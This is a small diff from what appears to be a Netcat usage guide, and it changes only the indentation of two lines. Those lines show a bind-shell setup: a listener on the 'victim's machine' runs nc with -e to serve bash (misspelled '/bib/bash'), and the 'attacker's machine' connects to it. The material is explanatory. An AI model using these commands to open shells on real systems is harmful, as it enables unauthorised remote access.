@@ -40,11 +40,11 @@ Netcat functions as a back-end tool that allows for port scanning and port liste
 
       In victim's machine
       
-      > nc -l -p [port] -e /bib/bash
+     > nc -l -p [port] -e /bib/bash
 
       In attacker's machine
       
-      > nc [IP] [port]
+     > nc [IP] [port]
 
 * Remote file transfering :
 
